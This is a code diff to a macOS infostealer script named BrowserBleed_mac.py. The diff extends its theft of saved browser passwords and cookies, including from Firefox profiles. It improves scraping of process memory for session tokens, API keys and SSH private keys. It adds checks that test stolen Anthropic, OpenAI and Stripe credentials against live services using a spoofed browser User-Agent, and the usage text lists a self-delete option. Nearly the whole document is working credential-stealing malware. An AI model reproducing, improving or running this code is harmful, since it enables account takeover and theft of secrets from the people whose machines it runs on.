@@ -6,18 +6,19 @@ Requires: Python 3.11+, cryptography (pip install cryptography)
 Run with sudo for memory scraping and process access.
 
 Notes:
-  - Chrome 130+ uses app-bound encryption; Keychain key may not decrypt v10 data.
-    Works reliably on Brave, Edge, Vivaldi, Opera, and older Chrome.
+  - Chrome 130+ uses app-bound encryption (v20); Keychain key cannot decrypt v20 data.
+    Works reliably on Brave, Edge, Vivaldi, Opera, and older Chrome (v10 blobs).
   - Memory scraping requires root (task_for_pid). Apple Silicon with SIP on will
     block some system processes but not browser renderer/GPU processes.
-  - Keychain access from sudo may still prompt on some macOS versions.
+  - Firefox cookie store (cookies.sqlite) is extracted unencrypted.
+    Firefox login decryption requires NSS and is not yet implemented.
 
 Usage:
   sudo python3 BrowserBleed_mac.py                    # all browsers, disk + memory
   sudo python3 BrowserBleed_mac.py --browser chrome   # target one browser
   sudo python3 BrowserBleed_mac.py --disk-only        # skip memory scraping
   sudo python3 BrowserBleed_mac.py --memory-only      # skip disk extraction
-  sudo python3 BrowserBleed_mac.py --out results.txt  # custom output path
+  sudo python3 BrowserBleed_mac.py --out results.txt  # custom output path (default: bb_results.txt)
   sudo python3 BrowserBleed_mac.py --max-hits 500     # raise memory hit cap
   sudo python3 BrowserBleed_mac.py --self-delete      # delete script after run
   sudo python3 BrowserBleed_mac.py --verify           # verify tokens against services (outbound)
@@ -26,6 +27,7 @@ Usage:
 import os
 import sys
 import json
+import glob
 import base64
 import sqlite3
 import shutil
@@ -42,6 +44,7 @@ import http.client
 import urllib.parse
 import urllib.request
 import urllib.error
+import concurrent.futures
 from datetime import datetime, timedelta, timezone
 
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
@@ -51,6 +54,9 @@ from cryptography.hazmat.backends import default_backend
 
 if sys.stdout is not None:
     sys.stdout.reconfigure(encoding="utf-8", errors="replace")
+
+# Gate OIDC discovery (outbound HTTP) behind --verify
+_do_oidc = False
 
 
 # ── Mach API setup ─────────────────────────────────────────────────────────────
@@ -129,22 +135,34 @@ def find_pids(name: str) -> list[int]:
 
 
 def is_process_running(name: str) -> bool:
-    return bool(find_pids(name))
+    # Use exact match (-x) to avoid matching Chrome Helper processes as "Chrome running"
+    try:
+        r = subprocess.run(["pgrep", "-x", name], capture_output=True, text=True)
+        return bool(r.stdout.strip())
+    except Exception:
+        return False
 
 
 def _pid_site_map(process_name: str) -> dict[int, str]:
-    """Map each renderer PID → site URL via --site-instance-site in the process command line."""
+    """Map each renderer PID → site URL via --site-instance-site in the process command line.
+    Uses ps -ww to avoid line truncation that drops the flag on systems with narrow terminals.
+    """
     sites: dict[int, str] = {}
     try:
-        r = subprocess.run(["ps", "aux"], capture_output=True, text=True)
+        r = subprocess.run(
+            ["ps", "-ww", "-A", "-o", "pid=,command="],
+            capture_output=True, text=True,
+        )
         for line in r.stdout.splitlines():
-            if process_name.lower() not in line.lower():
+            parts = line.strip().split(None, 1)
+            if len(parts) < 2:
                 continue
-            m_site = re.search(r"--site-instance-site=(https?://[^\s]+)", line)
-            # ps aux: USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND
-            m_pid  = re.match(r"\S+\s+(\d+)", line)
-            if m_site and m_pid:
-                sites[int(m_pid.group(1))] = m_site.group(1)
+            pid_str, cmd = parts
+            if process_name.lower() not in cmd.lower():
+                continue
+            m_site = re.search(r"--site-instance-site=(https?://[^\s]+)", cmd)
+            if m_site and pid_str.isdigit():
+                sites[int(pid_str)] = m_site.group(1)
     except Exception:
         pass
     return sites
@@ -177,12 +195,19 @@ def copy_db_with_wal(src: str) -> str:
     return tmp_db
 
 
-def sqlite_connect(path: str, retries: int = 8, delay: float = 0.25):
+def sqlite_connect(path: str):
+    return sqlite3.connect(path, timeout=2.0)
+
+
+def sqlite_execute(conn, query: str, retries: int = 8, delay: float = 0.25):
+    """Execute a query, retrying only on SQLITE_BUSY (locked database)."""
     last_err = None
     for _ in range(retries):
         try:
-            return sqlite3.connect(path)
-        except Exception as e:
+            return conn.execute(query)
+        except sqlite3.OperationalError as e:
+            if "locked" not in str(e):
+                raise
             last_err = e
             time.sleep(delay)
     raise last_err
@@ -224,6 +249,8 @@ def decrypt_value(key: bytes, enc: bytes) -> str:
     if not enc:
         return ""
     try:
+        if enc[:3] == b"v20":
+            return "<v20 app-bound encryption: requires in-process key — use memory scrape>"
         if enc[:3] == b"v10":
             # AES-128-CBC, IV = 16 space chars (Chrome macOS convention)
             iv        = b" " * 16
@@ -231,6 +258,8 @@ def decrypt_value(key: bytes, enc: bytes) -> str:
             decryptor = cipher.decryptor()
             plaintext = decryptor.update(enc[3:]) + decryptor.finalize()
             pad_len   = plaintext[-1]  # PKCS7 padding
+            if pad_len == 0 or pad_len > 16:
+                raise ValueError(f"Invalid PKCS7 padding byte: {pad_len}")
             return plaintext[:-pad_len].decode("utf-8", errors="replace")
         # Plaintext (pre-v10 or unsupported format)
         return enc.decode("utf-8", errors="replace")
@@ -260,12 +289,19 @@ CREDENTIAL_PATTERNS: dict[str, re.Pattern] = {
     "OAuth refresh_token": re.compile(rb"(?i)refresh_?token[\"'\s]*[=:][\"'\s]*([A-Za-z0-9\-._~+/=]{20,256})"),
     "Session token":       re.compile(rb"(?i)session[_-]?token[\"'\s]*[=:][\"'\s]*([A-Za-z0-9\-._~+/=%]{20,256})"),
     "Session ID":          re.compile(rb"(?i)session[_-]?id[\"'\s]*[=:][\"'\s]*([A-Fa-f0-9\-]{16,128})"),
-    "Password (POST body)":re.compile(rb"(?i)(?:^|&|\?)password=([A-Za-z0-9!@#$%^&*()\-_+=,.?:;~]{8,128})(?:&|$|\s|\x00)"),
+    "Password (POST body)":re.compile(rb"(?im)(?:^|&|\?)password=([A-Za-z0-9!@#$%^&*()\-_+=,.?:;~]{8,128})(?:&|$|\s|\x00)"),
     "Password (JSON/API)": re.compile(rb'(?i)"password"\s*:\s*"([A-Za-z0-9!@#$%^&*()\-_+=,.?:;~]{8,128})"'),
     "Google SAPISID":      re.compile(rb"SAPISID=[A-Za-z0-9_/\-]{20,}"),
     "Slack token":         re.compile(rb"xox[baprs]-[A-Za-z0-9\-]{10,}"),
     "GitHub token":        re.compile(rb"gh[pousr]_[A-Za-z0-9]{36,}"),
     "Discord token":       re.compile(rb"[MN][A-Za-z0-9]{23}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}"),
+    "AWS Access Key":      re.compile(rb"(?<![A-Z0-9])(A(?:KIA|SIA|ROA|IDA)[A-Z0-9]{16})(?![A-Z0-9])"),
+    "Stripe Secret Key":   re.compile(rb"sk_(?:live|test)_[A-Za-z0-9]{24,}"),
+    "npm Token":           re.compile(rb"npm_[A-Za-z0-9]{36}"),
+    "HuggingFace Token":   re.compile(rb"hf_[A-Za-z0-9]{34,}"),
+    "Vault Token":         re.compile(rb"hvs\.[A-Za-z0-9]{90,}"),
+    "Anthropic API Key":   re.compile(rb"sk-ant-[A-Za-z0-9\-_]{90,}"),
+    "SSH Private Key":     re.compile(rb"-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----"),
 }
 
 _NOISE_BYTES = re.compile(
@@ -303,7 +339,7 @@ def scrape_pid(pid: int, max_hits: int = 300, chunk: int = 4096) -> list[dict]:
         raise PermissionError(f"task_for_pid failed (kr={kr})")
 
     raw_hits: list[dict] = []
-    addr = _mach_vm_address_t(1)
+    addr = _mach_vm_address_t(0)
 
     try:
         while len(raw_hits) < max_hits:
@@ -328,7 +364,7 @@ def scrape_pid(pid: int, max_hits: int = 300, chunk: int = 4096) -> list[dict]:
             region_size = size.value
 
             if info.protection & VM_PROT_READ:
-                prev_data = b""  # tail of previous chunk within this region
+                prev_data = b""
                 for offset in range(0, region_size, chunk):
                     read_size = min(chunk, region_size - offset)
                     buf       = ctypes.create_string_buffer(read_size)
@@ -344,23 +380,31 @@ def scrape_pid(pid: int, max_hits: int = 300, chunk: int = 4096) -> list[dict]:
                         prev_data = b""
                         continue
                     data = buf.raw[: out_size.value]
+
+                    # Overlap last 512 bytes of previous chunk to catch tokens at boundaries
+                    overlap      = prev_data[-512:] if prev_data else b""
+                    search_data  = overlap + data
+                    overlap_len  = len(overlap)
+
                     for label, pat in CREDENTIAL_PATTERNS.items():
-                        for m in pat.finditer(data):
+                        for m in pat.finditer(search_data):
+                            # Skip matches fully contained in the overlap (already reported)
+                            if m.end() <= overlap_len:
+                                continue
                             raw_match    = m.group()
                             full_decoded = raw_match.decode(errors="replace")
                             if not _is_noise(raw_match, full_decoded):
                                 value = m.group(m.lastindex).decode(errors="replace") if m.lastindex else full_decoded
-                                if label == "Session ID":
-                                    dedup_key = value.rstrip("-")[:50]
-                                elif m.lastindex:
-                                    dedup_key = value[:50]
-                                else:
-                                    dedup_key = value[:120]
+                                # Address: clamp match start to current chunk's base
+                                match_in_data = max(0, m.start() - overlap_len)
+                                actual_addr   = hex(region_addr + offset + match_in_data)
+                                dedup_key     = f"{label}:{value.rstrip('-')[:80]}" if label == "Session ID" else f"{label}:{value[:80]}"
                                 pre = prev_data[-2048:] if prev_data else b""
-                                ctx = pre + data[:min(len(data), m.end() + 2048)]
+                                ctx_end = min(len(data), max(0, m.end() - overlap_len) + 2048)
+                                ctx = pre + data[:ctx_end]
                                 raw_hits.append({
                                     "label":     label,
-                                    "address":   hex(region_addr + offset + m.start()),
+                                    "address":   actual_addr,
                                     "value":     value,
                                     "dedup_key": dedup_key,
                                     "pid":       pid,
@@ -409,6 +453,107 @@ BROWSERS = [
     ("Chromium",       "Chromium",       os.path.join(_APP_SUPPORT, "Chromium"),                             "Chromium"),
 ]
 
+_DOMAIN_SVC: list[tuple[str, str]] = [
+    ("api.anthropic.com",               "Anthropic / Claude"),
+    ("claude.ai",                       "Anthropic / Claude"),
+    ("accounts.google.com",             "Google Accounts"),
+    ("oauth2.googleapis.com",           "Google OAuth2"),
+    ("identitytoolkit.googleapis.com",  "Firebase Auth"),
+    ("firebase.googleapis.com",         "Firebase / GCP"),
+    ("googleapis.com",                  "Google API"),
+    ("google.com",                      "Google"),
+    ("api.github.com",                  "GitHub"),
+    ("github.com",                      "GitHub"),
+    ("raw.githubusercontent.com",       "GitHub"),
+    ("api.slack.com",                   "Slack"),
+    ("slack.com",                       "Slack"),
+    ("api.openai.com",                  "OpenAI"),
+    ("chat.openai.com",                 "OpenAI"),
+    ("openai.com",                      "OpenAI"),
+    ("discord.com",                     "Discord"),
+    ("discordapp.com",                  "Discord"),
+    ("login.microsoftonline.com",       "Microsoft / Azure AD"),
+    ("graph.microsoft.com",             "Microsoft Graph"),
+    ("microsoftonline.com",             "Microsoft / Azure AD"),
+    ("login.live.com",                  "Microsoft"),
+    ("outlook.office365.com",           "Microsoft 365"),
+    ("portal.azure.com",                "Azure Portal"),
+    ("microsoft.com",                   "Microsoft"),
+    ("appleid.apple.com",               "Apple ID"),
+    ("idmsa.apple.com",                 "Apple ID"),
+    ("apple.com",                       "Apple"),
+    ("api.notion.com",                  "Notion"),
+    ("notion.so",                       "Notion"),
+    ("gitlab.com",                      "GitLab"),
+    ("api.digitalocean.com",            "DigitalOcean"),
+    ("digitalocean.com",                "DigitalOcean"),
+    ("auth0.com",                       "Auth0"),
+    ("okta.com",                        "Okta"),
+    ("cognito-idp",                     "AWS Cognito"),
+    ("amazonaws.com",                   "AWS"),
+    ("api.stripe.com",                  "Stripe"),
+    ("stripe.com",                      "Stripe"),
+    ("atlassian.net",                   "Atlassian"),
+    ("atlassian.com",                   "Atlassian"),
+    ("api.figma.com",                   "Figma"),
+    ("figma.com",                       "Figma"),
+    ("api.linear.app",                  "Linear"),
+    ("linear.app",                      "Linear"),
+    ("api.vercel.com",                  "Vercel"),
+    ("vercel.com",                      "Vercel"),
+    ("api.twilio.com",                  "Twilio"),
+    ("twilio.com",                      "Twilio"),
+    ("clerk.com",                       "Clerk"),
+    ("clerk.dev",                       "Clerk"),
+    ("supabase.co",                     "Supabase"),
+    ("supabase.com",                    "Supabase"),
+    ("ollama.com",                      "Ollama"),
+    ("netlify.com",                     "Netlify"),
+    ("heroku.com",                      "Heroku"),
+    ("pingidentity.com",                "PingIdentity"),
+    ("onelogin.com",                    "OneLogin"),
+    ("salesforce.com",                  "Salesforce"),
+    ("api.twitter.com",                 "Twitter / X"),
+    ("api.x.com",                       "Twitter / X"),
+    ("twitter.com",                     "Twitter / X"),
+    ("x.com",                           "Twitter / X"),
+    ("api.linkedin.com",                "LinkedIn"),
+    ("linkedin.com",                    "LinkedIn"),
+    ("graph.facebook.com",              "Meta Graph API"),
+    ("facebook.com",                    "Meta"),
+    ("instagram.com",                   "Instagram"),
+    ("app.datadoghq.com",               "Datadog"),
+    ("api.datadoghq.com",               "Datadog"),
+    ("registry.npmjs.org",              "npm"),
+    ("api.cloudflare.com",              "Cloudflare"),
+    ("app.terraform.io",                "HashiCorp Cloud"),
+    ("vault.hashicorp.com",             "HashiCorp Vault"),
+    ("api.sendgrid.com",                "SendGrid"),
+    ("api.hubspot.com",                 "HubSpot"),
+]
+
+
+# ── Profile enumeration ────────────────────────────────────────────────────────
+def _enum_profiles(user_data_path: str) -> list[tuple[str, str]]:
+    """Return list of (profile_path, display_name) for all existing Chromium profile dirs."""
+    candidates = ["Default"] + [f"Profile {i}" for i in range(1, 20)] + ["Guest Profile", "System Profile"]
+    profiles = []
+    for pname in candidates:
+        ppath = os.path.join(user_data_path, pname)
+        if not os.path.isdir(ppath):
+            continue
+        display = pname
+        prefs_file = os.path.join(ppath, "Preferences")
+        if os.path.exists(prefs_file):
+            try:
+                with open(prefs_file, encoding="utf-8", errors="replace") as f:
+                    prefs = json.load(f)
+                display = prefs.get("profile", {}).get("name", pname) or pname
+            except Exception:
+                pass
+        profiles.append((ppath, display))
+    return profiles
+
 
 # ── Disk extraction ────────────────────────────────────────────────────────────
 def extract_credentials(profile_path: str, master_key: bytes) -> list[dict]:
@@ -422,9 +567,7 @@ def extract_credentials(profile_path: str, master_key: bytes) -> list[dict]:
         conn    = sqlite_connect(tmp_db)
         results = [
             {"url": url, "username": user, "password": decrypt_value(master_key, enc) if enc else ""}
-            for url, user, enc in conn.execute(
-                "SELECT origin_url, username_value, password_value FROM logins"
-            )
+            for url, user, enc in sqlite_execute(conn, "SELECT origin_url, username_value, password_value FROM logins")
         ]
         conn.close()
         return results
@@ -441,43 +584,128 @@ def extract_cookies(profile_path: str, master_key: bytes) -> list[dict]:
     else:
         return []
 
-    results: list[dict] = []
+    _samesite_map = {0: "None", 1: "Lax", 2: "Strict"}
 
-    def _query(conn):
-        for host, name, value, enc, path, exp, secure, httponly in conn.execute(
-            "SELECT host_key, name, value, encrypted_value, path, "
-            "expires_utc, is_secure, is_httponly FROM cookies"
-        ):
-            results.append({
-                "host": host, "name": name,
-                "value": decrypt_value(master_key, enc) if enc else value,
-                "path": path, "expires": chrome_epoch_to_str(exp),
-                "secure": bool(secure), "httponly": bool(httponly),
-            })
+    def _query(conn) -> list[dict]:
+        rows = []
+        try:
+            cursor = sqlite_execute(conn,
+                "SELECT host_key, name, value, encrypted_value, path, "
+                "expires_utc, is_secure, is_httponly, samesite FROM cookies"
+            )
+            for host, name, value, enc, path, exp, secure, httponly, samesite in cursor:
+                rows.append({
+                    "host":     host,
+                    "name":     name,
+                    "value":    decrypt_value(master_key, enc) if enc else value,
+                    "path":     path,
+                    "expires":  chrome_epoch_to_str(exp),
+                    "secure":   bool(secure),
+                    "httponly": bool(httponly),
+                    "samesite": _samesite_map.get(samesite, "?"),
+                })
+        except (sqlite3.OperationalError, sqlite3.DatabaseError):
+            # Fallback for older Chrome schemas without samesite column
+            cursor = sqlite_execute(conn,
+                "SELECT host_key, name, value, encrypted_value, path, "
+                "expires_utc, is_secure, is_httponly FROM cookies"
+            )
+            for host, name, value, enc, path, exp, secure, httponly in cursor:
+                rows.append({
+                    "host":     host,
+                    "name":     name,
+                    "value":    decrypt_value(master_key, enc) if enc else value,
+                    "path":     path,
+                    "expires":  chrome_epoch_to_str(exp),
+                    "secure":   bool(secure),
+                    "httponly": bool(httponly),
+                    "samesite": "?",
+                })
         conn.close()
+        return rows
 
     # Attempt 1: immutable read (works when Chrome not actively writing)
     try:
-        uri = "file://" + os.path.abspath(db_path).replace(" ", "%20") + "?mode=ro&immutable=1"
-        _query(sqlite3.connect(uri, uri=True))
-        if results:
-            return results
-        results.clear()
+        uri  = "file://" + urllib.parse.quote(os.path.abspath(db_path), safe="/:") + "?mode=ro&immutable=1"
+        rows = _query(sqlite3.connect(uri, uri=True))
+        if rows:
+            return rows
     except Exception:
-        results.clear()
+        pass
 
     # Attempt 2: copy DB + WAL
     tmp_dir = None
     try:
         tmp_db  = copy_db_with_wal(db_path)
         tmp_dir = os.path.dirname(tmp_db)
-        _query(sqlite_connect(tmp_db))
-        return results
+        return _query(sqlite_connect(tmp_db))
     except Exception as e:
         raise RuntimeError(f"Cookie extraction failed: {e}") from e
     finally:
         if tmp_dir:
             shutil.rmtree(tmp_dir, ignore_errors=True)
+
+
+# ── Firefox extraction ─────────────────────────────────────────────────────────
+def extract_firefox_cookies(home: str) -> list[dict]:
+    """Extract unencrypted cookies from all Firefox profiles."""
+    ff_profiles_dir = os.path.join(home, "Library", "Application Support", "Firefox", "Profiles")
+    if not os.path.isdir(ff_profiles_dir):
+        return []
+    cookies: list[dict] = []
+    _ff_samesite = {0: "None", 1: "Lax", 2: "Strict"}
+    for profile_dir in os.listdir(ff_profiles_dir):
+        db_path = os.path.join(ff_profiles_dir, profile_dir, "cookies.sqlite")
+        if not os.path.exists(db_path):
+            continue
+        tmp_dir = None
+        try:
+            tmp_db  = copy_db_with_wal(db_path)
+            tmp_dir = os.path.dirname(tmp_db)
+            conn    = sqlite_connect(tmp_db)
+            for host, name, value, path, expiry, secure, httponly, samesite in sqlite_execute(
+                conn,
+                "SELECT host, name, value, path, expiry, isSecure, isHttpOnly, sameSite FROM moz_cookies"
+            ):
+                cookies.append({
+                    "profile":  profile_dir,
+                    "host":     host,
+                    "name":     name,
+                    "value":    value or "",
+                    "path":     path,
+                    "expires":  datetime.fromtimestamp(expiry, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC") if expiry else "session",
+                    "secure":   bool(secure),
+                    "httponly": bool(httponly),
+                    "samesite": _ff_samesite.get(samesite, "?"),
+                })
+            conn.close()
+        except Exception:
+            pass
+        finally:
+            if tmp_dir:
+                shutil.rmtree(tmp_dir, ignore_errors=True)
+    return cookies
+
+
+def process_firefox(home: str, do_disk: bool) -> list[str]:
+    lines = ["\n" + "=" * 70, "  BROWSER: Firefox", "=" * 70]
+    if not do_disk:
+        lines.append("  [--] Skipped (--memory-only)")
+        return lines
+    cookies = extract_firefox_cookies(home)
+    if not cookies:
+        lines.append("  [--] Not installed or no cookie databases found")
+        return lines
+    lines.append(f"[+] {len(cookies)} Firefox cookie(s) (unencrypted)\n")
+    lines.append("  [!] Firefox login decryption requires NSS — not yet implemented")
+    lines.append("  -- [DISK] Firefox Cookies --")
+    for ck in cookies:
+        lines.append(f"  Profile:  {ck['profile']}")
+        lines.append(f"  Host:     {ck['host']}")
+        lines.append(f"  Name:     {ck['name']}")
+        lines.append(f"  Value:    {ck['value']}")
+        lines.append(f"  Expires:  {ck['expires']}  Secure:{ck['secure']}  HttpOnly:{ck['httponly']}  SameSite:{ck['samesite']}\n")
+    return lines
 
 
 # ── CDP cookie extraction ──────────────────────────────────────────────────────
@@ -493,7 +721,7 @@ def unix_ts_to_str(ts: float) -> str:
 def _cdp_find_port(process_name: str) -> int | None:
     # Check process command line for explicit --remote-debugging-port flag
     try:
-        r = subprocess.run(["ps", "aux"], capture_output=True, text=True)
+        r = subprocess.run(["ps", "-ww", "-A", "-o", "pid=,command="], capture_output=True, text=True)
         for line in r.stdout.splitlines():
             if process_name.lower() in line.lower():
                 m = re.search(r"--remote-debugging-port=(\d+)", line)
@@ -576,7 +804,11 @@ def _ws_read_frame(s: socket.socket) -> tuple[bool, int, bytes]:
 
 
 def _ws_recv_msg(s: socket.socket) -> str:
-    parts = []
+    parts       = []
+    total_bytes = 0
+    frame_count = 0
+    MAX_FRAMES  = 1000
+    MAX_BYTES   = 64 * 1024 * 1024
     while True:
         fin, opcode, payload = _ws_read_frame(s)
         if opcode == 9:
@@ -589,6 +821,10 @@ def _ws_recv_msg(s: socket.socket) -> str:
         if opcode == 8:
             raise ConnectionError("WebSocket closed by server")
         parts.append(payload)
+        total_bytes += len(payload)
+        frame_count += 1
+        if total_bytes > MAX_BYTES or frame_count > MAX_FRAMES:
+            raise RuntimeError("WebSocket message exceeded size/frame limit")
         if fin:
             break
     return b"".join(parts).decode(errors="replace")
@@ -602,10 +838,14 @@ def _cdp_call(ws_url: str, method: str, params: dict | None = None) -> dict | No
     s = _ws_connect(host, port, path)
     try:
         _ws_send(s, json.dumps({"id": 1, "method": method, "params": params or {}}))
+        skipped = 0
         while True:
             data = json.loads(_ws_recv_msg(s))
             if data.get("id") == 1:
                 return data.get("result")
+            skipped += 1
+            if skipped > 500:
+                return None
     except Exception:
         return None
     finally:
@@ -645,6 +885,7 @@ def extract_cookies_cdp(process_name: str) -> list[dict]:
             "expires":  unix_ts_to_str(ck.get("expires", -1)),
             "secure":   ck.get("secure", False),
             "httponly": ck.get("httpOnly", False),
+            "samesite": ck.get("sameSite", "?"),
         })
     return cookies
 
@@ -655,76 +896,6 @@ _CTX_URL_PAT    = re.compile(rb"https?://([a-zA-Z0-9][a-zA-Z0-9\-]*(?:\.[a-zA-Z0
 _CTX_HOST_PAT   = re.compile(rb"Host:\s*([a-zA-Z0-9][a-zA-Z0-9\-]*(?:\.[a-zA-Z0-9\-]+)+)")
 _CTX_DOMAIN_PAT = re.compile(rb'"(?:domain|iss|host|origin|issuer|audience)"\s*:\s*"([a-zA-Z0-9\-\./]+)"')
 _CTX_COOKIE_DOM = re.compile(rb"[Dd]omain=\.?([a-zA-Z0-9][a-zA-Z0-9\-]*(?:\.[a-zA-Z0-9\-]+)+)")
-
-_DOMAIN_SVC: list[tuple[str, str]] = [
-    ("api.anthropic.com",               "Anthropic / Claude"),
-    ("claude.ai",                       "Anthropic / Claude"),
-    ("accounts.google.com",             "Google Accounts"),
-    ("oauth2.googleapis.com",           "Google OAuth2"),
-    ("identitytoolkit.googleapis.com",  "Firebase Auth"),
-    ("firebase.googleapis.com",         "Firebase / GCP"),
-    ("googleapis.com",                  "Google API"),
-    ("google.com",                      "Google"),
-    ("api.github.com",                  "GitHub"),
-    ("github.com",                      "GitHub"),
-    ("raw.githubusercontent.com",       "GitHub"),
-    ("api.slack.com",                   "Slack"),
-    ("slack.com",                       "Slack"),
-    ("api.openai.com",                  "OpenAI"),
-    ("chat.openai.com",                 "OpenAI"),
-    ("openai.com",                      "OpenAI"),
-    ("discord.com",                     "Discord"),
-    ("discordapp.com",                  "Discord"),
-    ("login.microsoftonline.com",       "Microsoft / Azure AD"),
-    ("graph.microsoft.com",             "Microsoft Graph"),
-    ("microsoftonline.com",             "Microsoft / Azure AD"),
-    ("login.live.com",                  "Microsoft"),
-    ("outlook.office365.com",           "Microsoft 365"),
-    ("microsoft.com",                   "Microsoft"),
-    ("appleid.apple.com",               "Apple ID"),
-    ("idmsa.apple.com",                 "Apple ID"),
-    ("apple.com",                       "Apple"),
-    ("api.notion.com",                  "Notion"),
-    ("notion.so",                       "Notion"),
-    ("gitlab.com",                      "GitLab"),
-    ("api.digitalocean.com",            "DigitalOcean"),
-    ("digitalocean.com",                "DigitalOcean"),
-    ("auth0.com",                       "Auth0"),
-    ("okta.com",                        "Okta"),
-    ("cognito-idp",                     "AWS Cognito"),
-    ("amazonaws.com",                   "AWS"),
-    ("api.stripe.com",                  "Stripe"),
-    ("stripe.com",                      "Stripe"),
-    ("atlassian.net",                   "Atlassian"),
-    ("atlassian.com",                   "Atlassian"),
-    ("api.figma.com",                   "Figma"),
-    ("figma.com",                       "Figma"),
-    ("api.linear.app",                  "Linear"),
-    ("linear.app",                      "Linear"),
-    ("api.vercel.com",                  "Vercel"),
-    ("vercel.com",                      "Vercel"),
-    ("api.twilio.com",                  "Twilio"),
-    ("twilio.com",                      "Twilio"),
-    ("clerk.com",                       "Clerk"),
-    ("clerk.dev",                       "Clerk"),
-    ("supabase.co",                     "Supabase"),
-    ("supabase.com",                    "Supabase"),
-    ("ollama.com",                      "Ollama"),
-    ("netlify.com",                     "Netlify"),
-    ("heroku.com",                      "Heroku"),
-    ("pingidentity.com",                "PingIdentity"),
-    ("onelogin.com",                    "OneLogin"),
-    ("salesforce.com",                  "Salesforce"),
-    ("api.twitter.com",                 "Twitter / X"),
-    ("api.x.com",                       "Twitter / X"),
-    ("twitter.com",                     "Twitter / X"),
-    ("x.com",                           "Twitter / X"),
-    ("api.linkedin.com",                "LinkedIn"),
-    ("linkedin.com",                    "LinkedIn"),
-    ("graph.facebook.com",              "Meta Graph API"),
-    ("facebook.com",                    "Meta"),
-    ("instagram.com",                   "Instagram"),
-]
 
 
 def _domain_matches(frag: str, domain: str) -> bool:
@@ -802,6 +973,8 @@ def _decode_jwt_header(token: str) -> dict:
 
 
 def _oidc_discover(issuer_url: str) -> str | None:
+    if not _do_oidc:
+        return None
     if issuer_url in _oidc_cache:
         return _oidc_cache[issuer_url]
     result = None
@@ -842,14 +1015,23 @@ def identify_service(label: str, value: str, context: bytes = b"") -> str:
                  "xoxr": "refresh", "xoxs": "service token"}
     if v[:4] in slack_map:
         return f"Slack ({slack_map[v[:4]]})"
+    # sk-ant- must be checked before sk- to avoid misidentifying Anthropic keys as OpenAI
+    if v.startswith("sk-ant-"): return "Anthropic / Claude"
     if v.startswith("sk-"):     return "OpenAI"
     if v.startswith("glpat-"): return "GitLab"
     if v.startswith("dp."):    return "DigitalOcean"
     if v.startswith("pat_"):   return "Notion"
-    if label == "Google SAPISID":  return "Google (YouTube / Gmail)"
-    if label == "Discord token":   return "Discord"
-    if label == "Slack token":     return "Slack"
-    if label == "GitHub token":    return "GitHub"
+    if label == "Google SAPISID":    return "Google (YouTube / Gmail)"
+    if label == "Discord token":     return "Discord"
+    if label == "Slack token":       return "Slack"
+    if label == "GitHub token":      return "GitHub"
+    if label == "AWS Access Key":    return "AWS"
+    if label == "Stripe Secret Key": return "Stripe"
+    if label == "npm Token":         return "npm"
+    if label == "HuggingFace Token": return "HuggingFace"
+    if label == "Vault Token":       return "HashiCorp Vault"
+    if label == "Anthropic API Key": return "Anthropic / Claude"
+    if label == "SSH Private Key":   return "SSH"
     if re.match(r"^20111[A-Za-z0-9\-_]{20,}$", v):
         return "Anthropic / Claude"
     if label == "JWT token" or (v.startswith("eyJ") and v.count(".") == 2):
@@ -901,7 +1083,13 @@ def identify_service(label: str, value: str, context: bytes = b"") -> str:
 
 
 def _http_get(url: str, headers: dict | None = None, timeout: int = 6) -> tuple[int, dict]:
-    req = urllib.request.Request(url, headers=headers or {})
+    headers = headers or {}
+    if "User-Agent" not in headers:
+        headers["User-Agent"] = (
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
+            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+        )
+    req = urllib.request.Request(url, headers=headers)
     try:
         with urllib.request.urlopen(req, timeout=timeout) as resp:
             return resp.status, json.loads(resp.read().decode(errors="replace"))
@@ -972,6 +1160,16 @@ def verify_jwt(token: str) -> dict:
 
 
 def verify_anthropic(token: str) -> dict:
+    if token.startswith("20111") or not token.startswith("sk-"):
+        # Browser session token — verify against claude.ai
+        status, data = _http_get(
+            "https://claude.ai/api/organizations",
+            headers={"Cookie": f"sessionKey={token}"},
+        )
+        if status == 200:
+            return {"valid": True, "type": "session token"}
+        return {"valid": False, "reason": f"HTTP {status}"}
+    # API key
     status, data = _http_get(
         "https://api.anthropic.com/v1/models",
         headers={"x-api-key": token, "anthropic-version": "2023-06-01"},
@@ -981,6 +1179,34 @@ def verify_anthropic(token: str) -> dict:
         return {"valid": True, "models_visible": ", ".join(models) or "?"}
     err = data.get("error", {})
     return {"valid": False, "reason": err.get("message", f"HTTP {status}") if isinstance(err, dict) else f"HTTP {status}"}
+
+
+def verify_openai(token: str) -> dict:
+    status, data = _http_get(
+        "https://api.openai.com/v1/models",
+        headers={"Authorization": f"Bearer {token}"},
+    )
+    if status == 200:
+        return {"valid": True, "models": len(data.get("data", []))}
+    err = data.get("error", {})
+    return {"valid": False, "reason": err.get("message", f"HTTP {status}") if isinstance(err, dict) else f"HTTP {status}"}
+
+
+def verify_stripe(token: str) -> dict:
+    status, data = _http_get(
+        "https://api.stripe.com/v1/account",
+        headers={"Authorization": f"Bearer {token}"},
+    )
+    if status == 200:
+        return {"valid": True, "id": data.get("id", "?"), "email": data.get("email", "?")}
+    err = data.get("error", {})
+    return {"valid": False, "reason": err.get("message", f"HTTP {status}") if isinstance(err, dict) else f"HTTP {status}"}
+
+
+def verify_aws(token: str) -> dict:
+    if re.match(r"^(AKIA|ASIA|AROA|AIDA)[A-Z0-9]{16}$", token):
+        return {"valid": None, "reason": "valid format — secret key needed to verify via STS"}
+    return {"valid": False, "reason": "invalid AWS key format"}
 
 
 def verify_hit(label: str, value: str, service: str) -> dict | None:
@@ -993,6 +1219,12 @@ def verify_hit(label: str, value: str, service: str) -> dict | None:
         return verify_slack(raw)
     if "Anthropic" in service:
         return verify_anthropic(raw)
+    if "OpenAI" in service:
+        return verify_openai(raw)
+    if "Stripe" in service or label == "Stripe Secret Key":
+        return verify_stripe(raw)
+    if label == "AWS Access Key":
+        return verify_aws(raw)
     if label == "JWT token":
         return verify_jwt(raw)
     return None
@@ -1021,6 +1253,8 @@ def process_browser(name: str, process_name: str, user_data_path: str, keychain_
         lines.append("  [--] Not installed\n")
         return lines
 
